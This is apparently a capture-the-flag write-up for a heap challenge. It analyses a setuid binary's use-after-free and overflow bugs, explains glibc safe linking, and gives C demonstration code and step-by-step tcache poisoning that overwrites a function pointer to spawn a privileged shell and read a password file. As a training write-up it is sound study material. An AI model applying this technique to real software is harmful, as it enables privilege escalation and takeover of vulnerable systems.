```sh
level03@override:~$ checksec virek
[*] '/home/level03/virek'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
level03@override:~$ file virek
virek: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f5e582b3ee6d57f06a44dddc69c8bf21435a57c, for GNU/Linux 3.2.0, stripped

```

Upon analyzing the source code of our level03 `virek.c`, we cannot see any buffer overflow or stack-related vulnerabilities.

However, we can see several vulnerabilities related to heap management and manipulation. To address these, we will describe these observed operations to understand the level of privilege they grant us over heap memory, allowing us to define our approach:

```c
static void node_new(void) {
    printf("size: "); fflush(stdout); size_t sz = (size_t)rd_long();
    if (sz == 0 || sz > MAX_SIZE) { puts("[VIREK] bad size."); return; }
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_NODES) return;
    nodes[i] = malloc(sz);
    node_sz[i] = sz;
    printf("[VIREK] node allocated in slot %ld.\n", i);
}
static void node_del(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_NODES || !nodes[i]) return;
    free(nodes[i]);
    puts("[VIREK] node released.");
}
static void node_edit(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_NODES || !nodes[i]) return;
    printf("len: "); fflush(stdout); size_t n = (size_t)rd_long();
    printf("data: "); fflush(stdout);
    read(STDIN_FILENO, nodes[i], n);
}
static void node_view(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_NODES || !nodes[i]) return;
    printf("[VIREK] node data: ");
    write(STDOUT_FILENO, nodes[i], node_sz[i]);
    puts("");
}
static void node_sync(void) {
    g_admin.action();
}

```

1. **`node_new`**: Gives us the ability to allocate a chunk of memory with a size between [1, 2047]. The chunk will have its reference stored in `static char *nodes[MAX_NODES];` (with a maximum of 16 references), and its size will be stored in `static size_t node_sz[MAX_NODES];`.
2. **`node_del`**: Gives us the ability to delete a specific chunk of data from the storage array `nodes`. However, as you can notice, it does not reinitialize the pointer to `NULL`, resulting in a Use-After-Free (UAF) vulnerability.
3. **`node_edit`**: Gives us the ability to edit any reference pointer from the `nodes` table with any data size, even if it exceeds its original allocated size, resulting in a heap buffer overflow vulnerability.
4. **`node_view`**: Allows us to view the data in our chunks of memory, limited by the length that was allocated initially. This is the only function without a bug in the source code.
5. **`node_sync`**: Calls a function pointer stored in `.bss` that defaults to calling `default_action`.

From the source code, our goal is clearly to manipulate the `g_admin` structure, change the function address pointed to by `g_admin.action`, and invoke `win`, which executes a shell.

The main problem is that our target resides in the `.bss` (Block Started by Symbol) section, whereas we only control heap memory. So, can we somehow transfer our control from the heap to `.bss`?

The answer is yes: we can exploit the fact that when a chunk of data is allocated and freed on the heap, its internal metadata changes. Let's investigate this idea:

The following code is used to investigate what remains inside a freed chunk—does it still hold our old user data?

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    char *ptr = malloc(24);
    memset(ptr, 'c', 23);
    ptr[23]=0;
    printf("Allocate 24 byte and intialize it with 'c' : %s\n", ptr);
    free(ptr);
    printf("After freeing it : %s\n", ptr);
}

```

Result:

```sh
level03@override:~$ ./a.out 
Allocate 24 byte and intialize it with 'c' : ccccccccccccccccccccccc
After freeing it : H~,�

```

Based on the output, we can see that after being freed, the pointer no longer holds our original user data. So what is stored here instead?

Let's inspect the memory structure more specifically to see what these new values in our old chunk represent:

```c
    char *ptr = malloc(24);
    memset(ptr, 'c', 23);
    ptr[23]=0;
    printf("Allocate 24 byte and intialize it with 'c':in-hex:%x: %s\n", 'c',ptr);
    free(ptr);
    printf("Bytes: ");
    long * l_ptr = (long *) ptr; 
    for (int i = 0; i < 24/8; i++)
            printf("ptr[%d]=[0x%016lx] ", i, *(l_ptr+i));
    printf("\n");

```

With this updated code, we can observe exactly what values are stored inside our freed pointer. Notice the output:

```sh
level03@override:~$ ./a.out 
Allocate 24 byte and intialize it with 'c':in-hex:63: ccccccccccccccccccccccc
Bytes: ptr[0]=[0x0000000621563cc9] ptr[1]=[0xdcd9e311be6b0a99] ptr[2]=[0x0063636363636363] 
level03@override:~$ ./a.out 
Allocate 24 byte and intialize it with 'c':in-hex:63: ccccccccccccccccccccccc
Bytes: ptr[0]=[0x00000005bc84ff6e] ptr[1]=[0x5e600358c67ba542] ptr[2]=[0x0063636363636363] 

```

Hmm, weirdly enough, each time we free a chunk, two addresses (or metadata fields) are placed in the first 16 bytes of our previously allocated chunk's payload. What could they be?

After looking into glibc `ptmalloc` internals, we find that these slots store management pointers:

* **`fd` (Forward Pointer):** Points to the next free chunk in a singly-linked or doubly-linked bin.
* **`bk` (Backward Pointer):** Points to the previous free chunk in doubly-linked bins (or acts as the `key` field in `tcache` chunks for double-free detection in glibc $\ge$ 2.29).

Before diving into the attack, let's establish a quick summary of chunk layouts, bin structures, Safe Linking mechanics, and how Use-After-Free (UAF) breaks these protections to yield an arbitrary write primitive.

---

## Heap Chunk Structure

In 64-bit glibc, chunks are 16-byte aligned. The memory layout shifts depending on whether a chunk is allocated or free.

```
          ALLOCATED CHUNK                          FREED CHUNK (tcache / fastbin)
+-------------------------------+               +-------------------------------+
|       prev_size (if prev free)|               |       prev_size (if prev free)|
+-------------------------------+               +-------------------------------+
|      chunk_size | A | M | P   |               |      chunk_size | A | M | P   |
+-------------------------------+ <-- user_mem  +-------------------------------+ <-- user_mem
|                               |               |     fd (Protected Pointer)    |
|          User Data            |               +-------------------------------+
|                               |               |    key (tcache) or unused     |
+-------------------------------+               +-------------------------------+

```

* `prev_size`: Stores the size of the previous chunk if it is free. If the previous chunk is currently allocated, this space is used by that chunk to store user data.
* `chunk_size`: Stores the total size of the current chunk (including header space). Because chunk sizes are aligned, the lowest 3 bits are free to act as status flags:
* **P (PREV_INUSE, value 0x1):** Set to 1 if the previous chunk is allocated.
* **M (IS_MMAPPED, value 0x2):** Set to 1 if the chunk was allocated with `mmap` instead of the main heap.
* **A (NON_MAIN_ARENA, value 0x4):** Set to 1 if the chunk belongs to a secondary arena rather than the main arena.



---

## Bins and Free Lists

glibc manages freed memory using list structures called bins. Safe Linking specifically protects singly-linked bins:

1. **tcache (Thread Local Cache, glibc 2.26+)**
A fast, singly-linked list dedicated to each thread. It holds up to 7 chunks per size class for small allocations. Because `malloc` checks `tcache` first, it is the primary target for pointer modification.
2. **fastbins**
A global singly-linked list for small allocations.
3. **Unsorted, Small, and Large Bins**
Doubly-linked lists that use both `fd` and `bk` pointers. Safe Linking does not apply to these bins.

---

### Safe Linking Protection (glibc 2.32+)

Before glibc 2.32, an attacker with a Use-After-Free write could replace an `fd` pointer with a target address $T$. The next `malloc` calls would then grant an allocation pointing directly to $T$.

Safe Linking prevents this by obfuscating stored pointers using an XOR operation with the chunk's own memory location:

`Protected_Ptr = (Pos >> 12) ^ Ptr`

* **Pos** is the memory address where the `fd` pointer itself is stored (`&chunk->fd`).
* **Pos >> 12** shifts right by 12 bits to strip page offsets, leaving the randomized ASLR heap page base.
* **Ptr** is the actual destination pointer.

To recover the original destination pointer from memory:

`Real_Ptr = (Pos >> 12) ^ Protected_Ptr`

In glibc source code, this is implemented as:

```c
#define PROTECT_PTR(pos, ptr) (((size_t) pos >> 12) ^ (size_t) ptr)
#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)

```

---

### Bypassing Safe Linking via UAF

**Step 1: Leak the Heap Address**
When a chunk is the last item in a `tcache` or `fastbin` list (or the only item, Chunk A), its next pointer (`Ptr`) is `NULL` (`0x0`).
When protected, the stored value becomes: `(Pos >> 12) ^ 0 = Pos >> 12`.

1. Allocate Chunk A.
2. Free Chunk A into `tcache` (its next pointer becomes `NULL`).
3. Use a Use-After-Free read on Chunk A's payload to read the stored `fd` value. This value is equal to `Pos >> 12`.
4. Shift this value left by 12 bits to reconstruct the heap base address:
`Heap_Base = Leaked_Value << 12`

**Step 2: Craft the Target Pointer**
Using the known `Pos >> 12` value, calculate the masked pointer needed to reach target location $T$:

`Mangled_Target = (Pos >> 12) ^ T`

**Step 3: Poison the Free List**

1. Use a Use-After-Free read on Chunk A to retrieve `Pos >> 12`.
2. Allocate a second chunk (Chunk B), free it, and update its `fd` pointer using `(Pos >> 12) ^ T`.
3. When glibc reads this pointer and passes it through `REVEAL_PTR`, it evaluates directly to target location $T$.

**Step 4: Trigger Arbitrary Write**

1. Call `malloc()` once to claim Chunk B and set the new head pointer to location $T$.
2. Call `malloc()` a second time to receive a pointer allocated at location $T$.
3. Writing to this allocated memory writes data directly to location $T$.

This is how we will approach our vulnerable target code to pivot from heap control to the `.bss` section. Let's look at a simple demonstration in C:

We will allocate two chunks of data on the heap, free both of them, use the first chunk (Chunk A) to retrieve the ASLR offset (`Pos >> 12`), update the second chunk's `fd` pointer, and then make two new allocations (Chunk A', Chunk B'). Let's see the demonstration:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main(void) {
    // Target buffer on the stack
    char target[30] = "42T";
    printf("Target address : %p\n", (void *)target);

    // Allocate and initialize chunk
    char *ptr = malloc(24);
    memset(ptr, 'c', 23);
    ptr[23] = '\0';
    printf("Allocated ptr  : %p\n", (void *)ptr);

    char *ptr2 = malloc(24);
    memset(ptr2, 'c', 23);
    ptr2[23] = '\0';
    printf("Allocated ptr  : %p\n", (void *)ptr2);

    // Free chunk into tcache
    free(ptr);
    free(ptr2);

    uint64_t *l_ptr = (uint64_t *)ptr;
    uint64_t *l_ptr2 = (uint64_t *)ptr2;

    printf("Mangled NULL fd: 0x%016lx\n", *l_ptr);
    printf("Mangled HEAD T fd: 0x%016lx\n", *l_ptr2);

    // Poison fd: (*l_ptr holds 'Pos >> 12', so XORing with target yields 'PROTECT_PTR(Pos, Target)')
    *l_ptr2 = (*l_ptr) ^ ((uintptr_t)target);
    printf("Poisoned fd2    : 0x%016lx\n", *l_ptr2);

    // 1st malloc: Returns 'ptr' and promotes 'target' to tcache head
    char *p1 = malloc(24);
    printf("1st malloc     : %p (Popped ptr)\n", (void *)p1);

    // 2nd malloc: Returns target address from tcache head
    char *p2 = malloc(24);
    printf("2nd malloc     : %p (Target returned! Content: %s)\n", (void *)p2, p2);

    return 0;
}

```

We selected a target address on the stack (`char target[30] = "42T";`). The goal here was to allocate a chunk at that stack position and display the string `'42T'` as proof of success:

```sh
Target address : 0x7ffede09ab70
Allocated ptr  : 0x61b06c26b6b0
Allocated ptr  : 0x61b06c26b6d0
Mangled NULL fd: 0x000000061b06c26b
Mangled HEAD T fd: 0x000061b6772074db
Poisoned fd2    : 0x00007ff8c50f691b
1st malloc     : 0x61b06c26b6d0 (Popped ptr)
2nd malloc     : 0x7ffede09ab70 (Target returned! Content: 42T)

```

Our target address exists at `0x7ffede09ab70`. By leveraging the arbitrary write derived from the Use-After-Free vulnerability, we successfully allocated a second chunk directly on the stack and displayed `'42T'`. Using this same concept, we can craft our exploit against the target program using its internal functions:

```
[allocate chunk A]: call node_new (option 1)
[allocate chunk B]: call node_new (option 1)
[delete chunk A]: call node_del (option 2)
[read chunk A - leak (Pos>>12)]: call node_view (option 4)
[delete chunk B]: call node_del (option 2)
[edit chunk B - set fd = T ^ (Pos>>12)]: call node_edit (option 3)
[allocate chunk A]: call node_new (option 1)
[allocate chunk B - allocate at T]: call node_new (option 1)
[edit chunk B - overwrite address T with &win]: call node_edit (option 3)
[trigger payload]: call node_sync (option 5)

```

And that's it! The full implementation is in `exploit.py`, and running it yields:

```sh
level03@override:~$ python3 exploit.py 
[+] Starting local process './virek': pid 1746
leaked_win : 0x5bfa567f82e9
leaked_PIE : 0x5bfa567f7000
leaked_fd 0: 0x5bfa7a13c,  bk: 0xc6269ada4fde1ebf
leaked_fd 1: 0x5bffc5b4639c,  bk: 0xc6269ada4fde1ebf
flag{v82y1ljphcb0is9rn4i8bxrtyscyjm4c}
[*] Switching to interactive mode

```

For a more detailed output showing the freed chunk pointers, see below:

```sh
level03@override:~$ echo ""> exploit.py && vim exploit.py  && python3 exploit.py 
[+] Starting local process './virek': pid 1326
leaked_win : 0x600ffc1192e9
leaked_PIE : 0x600ffc118000
b'[VIREK] node data: \xeeh\x02\x01\x06\x00\x00\x00\x9e\x82G\x16M\xb5~\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
leaked_fd 0: 0x6010268ee,  bk: 0xe47eb54d1647829e
b"[VIREK] node data: N\x8a\x8c'\x16`\x00\x00\x9e\x82G\x16M\xb5~\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n"
leaked_fd 1: 0x6016278c8a4e,  bk: 0xe47eb54d1647829e
position of the _g_admin_action pointer 0x600ffc11c040
OLlal :  0x6009fd13a8ae
[*] Switching to interactive mode
$ ls
README  exploit.py  virek  virek.c
$ whoami
flag03
$ cat /home/flag03/.pass
v82y1ljphcb0is9rn4i8bxrtyscyjm4c

```